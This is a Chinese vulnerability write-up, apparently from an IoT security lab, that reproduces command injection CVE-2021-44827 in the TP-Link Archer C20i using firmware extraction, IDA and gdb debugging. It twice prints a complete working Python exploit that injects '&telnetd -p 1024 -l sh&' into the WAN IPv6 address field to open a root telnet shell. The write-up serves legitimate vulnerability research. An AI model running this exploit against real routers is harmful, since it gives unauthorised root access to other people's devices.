# TP-Link Archer C20i 命令执行漏洞
> 0431物联卫士实验室
> 来源：https://www.iotsec-zone.com/article/111


> - 测试环境：Ubuntu 18.04
> - 固件版本：**Archer C20i(EU)_V1_160518**
> - CVE编号：CVE-2021-44827
> - 厂商地址：[https://www.tp-link.com/](https://www.tp-link.com/)
> - 漏洞类型：命令执行

## 0x00 .前言

在CVE官网中公布了一个TP-Link CVE编号为CVE-2021-44827的命令执行漏洞，还是按老规矩直接去官网下载固件，将其移动到虚拟机中

## 0x01.固件提取

使用命令binwalk对固件进行解包
![0.png](https://www.iotsec-zone.com/images/MdImg/ac0fa45ca50a470e1710cb05f48e2c23.png)

![1.png](https://www.iotsec-zone.com/images/MdImg/9f3d4b36a0d2ad62872a00998d33683f.png)

为了方便我们对固件包名进行了重命名，可以看到我们成功的解压了固件，拿到了固件的文件系统，接下来我们就可以对其进行分析了

## 0x02.漏洞分析

通过漏洞信息我们可以知道，此次的漏洞是WAN设置服务的命令执行，漏洞的位置是在设置网络相关参数的位置，具体的参数关键词是X_TP_ExternalIPv6Address，后端没有对其验证直接进行拼接了

![2.png](https://www.iotsec-zone.com/images/MdImg/41ddf5fdfa0a16801ec2692bf238e33a.png)

![3.png](https://www.iotsec-zone.com/images/MdImg/c1cdad6bda0fa30b2c037b0da20b2a26.png)

然后调用lib.js中的ajax发送post请求到后端进行处理，那么我们将后端的二进制文件放到IDA中打开，去查看一下处理此请求的二进制文件

![4.png](https://www.iotsec-zone.com/images/MdImg/8a1d83f8ecb8de325136de9270d3e98b.png)

通过字符串搜索关键词，可以发现它是通过cgi后面加上数字进行不同服务的调用的

通过关键词搜索没有找到，可以看出最后处理这个请求的服务不在这个页面

继续查看其他二进制文件，查找处理这个请求的服务，发现在tdpd和tmpd中也出现了相关的字符串

![5.png](https://www.iotsec-zone.com/images/MdImg/8a204e7c8e11786810f10883e3dc1d57.png)

![6.png](https://www.iotsec-zone.com/images/MdImg/5cd2c941e733ecd646376ecaa7b8c128.png)

两个文件的内容基本是一致的，具体造成telnetd服务被开启的命令是那呢？我们继续往下分析，可以看到httpd，tdpd和tmpd都会调用rdp_***相关的动态链接库，那么可以查找一下相关的动态链接库

![7.png](https://www.iotsec-zone.com/images/MdImg/d55a6092d6f38842f1f1ea8fd91cbb58.png)

这里可以看到对应的链接库为libcmm.so，那么我们可以猜想触发漏洞的位置可能位于此位置

## 0x03.动态调试分析

为了方便追踪数据的内存排布，这里使用gdbserver进行远程调试，由于这个漏洞能直接RCE，那么我们可以利用漏洞直接进入shell模式

使用的EXP如下：

```shell
import requests
import base64
import os
import time

ip = input("请输入要检测的IP地址：")
username = input("请输入管理员账户：")
password = input("请输入管理员密码：")
tplink_url = "http://" + ip + "/cgi?2&2"
userinfo = username + ":" + password
cookie = "Authorization=Basic " + base64.b64encode(userinfo.encode()).decode("ascii")
referer = "http://" + ip +"/mainFrame.htm"
cmd = "telnet " + ip + " 1024"
payload_template = """[WAN_ETH_INTF#1,0,0,0,0,0#0,0,0,0,0,0]0,1\r
X_TP_lastUsedIntf=ipoe_eth3_s\r
[WAN_IP_CONN#1,1,1,0,0,0#0,0,0,0,0,0]1,21\r
externalIPAddress=192.168.9.222\r
subnetMask=255.255.255.0\r
defaultGateway=192.168.9.2\r
NATEnabled=1\r
X_TP_FullconeNATEnabled=0\r
X_TP_FirewallEnabled=1\r
X_TP_IGMPProxyEnabled=1\r
X_TP_IGMPForceVersion=0\r
maxMTUSize=1500\r
DNSOverrideAllowed=1\r
DNSServers=192.168.9.3,0.0.0.0\r
X_TP_IPv4Enabled=1\r
X_TP_IPv6Enabled=0\r
X_TP_IPv6AddressingType=Static\r
X_TP_ExternalIPv6Address=commond\r
X_TP_PrefixLength=64\r
X_TP_DefaultIPv6Gateway=::\r
X_TP_IPv6DNSOverrideAllowed=0\r
X_TP_IPv6DNSServers=::,::\r
X_TP_MLDProxyEnabled=0\r
enable=1\r
"""
payload = payload_template.replace("commond", "::")
res = requests.post(tplink_url, data=payload, headers={"Referer": referer, "Cookie": cookie})
time.sleep(5)
print("===========")
payload = payload_template.replace("commond", "&telnetd -p 1024 -l sh&")
res = requests.post(tplink_url, data=payload, headers={"Referer": referer, "Cookie": cookie})
os.system(cmd)
```

![8.png](https://www.iotsec-zone.com/images/MdImg/817402d5faf9bd2117fbb4bfa4c0a4b5.png)

为了进行远程gdb调试，需要将gdb服务端传入到系统中，由于系统本身的busybox进行了阉割，wget，curl等命令都没有，scp命令存在，由于模拟环境下scp会报dbclient缺失错误

![9.png](https://www.iotsec-zone.com/images/MdImg/df819dba4071a7bec9994889f3544da9.png)

这里使用的是firmadyne文件夹下提供的busybox的wget命令进行下载gdb服务端程序

![10.png](https://www.iotsec-zone.com/images/MdImg/8cfced7c2b9e82fd677e546582777d08.png)

这时，我们就可以进行远程gdb调试了

查看要进行调试的进程的PID，然后将gdb 服务端 attach上对应的PID即可

![11.png](https://www.iotsec-zone.com/images/MdImg/c9eea74218701515098a349f79459054.png)

客户端使用gdb-multiarch与服务端建立连接

![12.png](https://www.iotsec-zone.com/images/MdImg/73292e90b9abd2e512d052acace4d11b.png)

**PS：这里建议使用solib-search-path进行动态链接库的查找，不然可能会出现调试不了动态链接库的情况**

这里我们可以先在rdp_getObj，rdp_setObj设置相关断点，这些函数都位于动态链接库中，并且负责数据的获取和配置操作，也就是会对上述的payload_template中的数据进行处理

![13.png](https://www.iotsec-zone.com/images/MdImg/6473ad406e254e4c56a0d58237e0f954.png)

在执行脚本后，可以看到直接获取到了传递的payload_template中的键值

![14.png](https://www.iotsec-zone.com/images/MdImg/5c619bbfc878bfbfb2845b91362e59bf.png)

对于第一个认证请求，直接使用c继续运行，我们要进行抓取和分析的是post上传的请求

![15.png](https://www.iotsec-zone.com/images/MdImg/a447048ad70709b492b2b8475e31079b.png)

出现====时，则说明发送的是post配置请求，然后继续按c

![16.png](https://www.iotsec-zone.com/images/MdImg/348ea28675d16cc905b9ba9649b54367.png)

可以看到当地址跳转到0x403eb8时，成功执行，由于此漏洞是在设置WAN的时候，造成了命令执行，我们在IDA中快速检索，可以看到如下函数

![17.png](https://www.iotsec-zone.com/images/MdImg/1e2f3b9757a8fdddc6f5da0a5aa15ac4.png)

这里进行设置WAN并且可以看到util_execSystem命令执行函数，那么我们对util_execSystem下断点

```shell
b util_execSystem
```

然后进行调试，得到如下内容

![18.png](https://www.iotsec-zone.com/images/MdImg/354b6f921cdcbf19acf3bfe5900e8f1e.png)

可以看到拼接传递的telnetd是可以被拼接的，在gdb中继续单步执行，可以看到拼接后的字符串

![19.png](https://www.iotsec-zone.com/images/MdImg/91ddc5b4db29ddb30de7ea6b64e6ed8e.png)

这时候，再执行步出，跳出当前函数，使用telnet尝试连接

![20.png](https://www.iotsec-zone.com/images/MdImg/2513b7f5acb09ea0837173b0ff647543.png)

可以看到telnetd服务已经启动，证明命令执行成功

## 0x04.最终POC

既然我们已经知道出现漏洞的服务是哪个和具体参数，那么我们接下面就写poc来测试一下

我测试过这个服务是需要授权的，那么我们就在我们的poc中加入认证信息

```python
import requests
import base64
import os
import time

ip = input("请输入要检测的IP地址：")
username = input("请输入管理员账户：")
password = input("请输入管理员密码：")
tplink_url = "http://" + ip + "/cgi?2&2"
userinfo = username + ":" + password
cookie = "Authorization=Basic " + base64.b64encode(userinfo.encode()).decode("ascii")
referer = "http://" + ip +"/mainFrame.htm"
cmd = "telnet " + ip + " 1024"
payload_template = """[WAN_ETH_INTF#1,0,0,0,0,0#0,0,0,0,0,0]0,1\r
X_TP_lastUsedIntf=ipoe_eth3_s\r
[WAN_IP_CONN#1,1,1,0,0,0#0,0,0,0,0,0]1,21\r
externalIPAddress=192.168.9.222\r
subnetMask=255.255.255.0\r
defaultGateway=192.168.9.2\r
NATEnabled=1\r
X_TP_FullconeNATEnabled=0\r
X_TP_FirewallEnabled=1\r
X_TP_IGMPProxyEnabled=1\r
X_TP_IGMPForceVersion=0\r
maxMTUSize=1500\r
DNSOverrideAllowed=1\r
DNSServers=192.168.9.3,0.0.0.0\r
X_TP_IPv4Enabled=1\r
X_TP_IPv6Enabled=0\r
X_TP_IPv6AddressingType=Static\r
X_TP_ExternalIPv6Address=commond\r
X_TP_PrefixLength=64\r
X_TP_DefaultIPv6Gateway=::\r
X_TP_IPv6DNSOverrideAllowed=0\r
X_TP_IPv6DNSServers=::,::\r
X_TP_MLDProxyEnabled=0\r
enable=1\r
"""
payload = payload_template.replace("commond", "::")
res = requests.post(tplink_url, data=payload, headers={"Referer": referer, "Cookie": cookie})
time.sleep(5)
payload = payload_template.replace("commond", "&telnetd -p 1024 -l sh&")
res = requests.post(tplink_url, data=payload, headers={"Referer": referer, "Cookie": cookie})
os.system(cmd)
```

![21.png](https://www.iotsec-zone.com/images/MdImg/bdb4f0359dd5708d27a683479f80b160.png)

成功登录telnet，无需密码直接进入，而且权限是root权限

## 0x05 总结

本次的漏洞复现及分析和以往的方法不一样，本次使用的是动态调试+静态分析，当我们知道已知漏洞，但是不知道具体发生点在什么位置，我们就可以使用此方式对齐动态调试，而这种方法在我们常规挖漏洞中也是最常用的一种方法
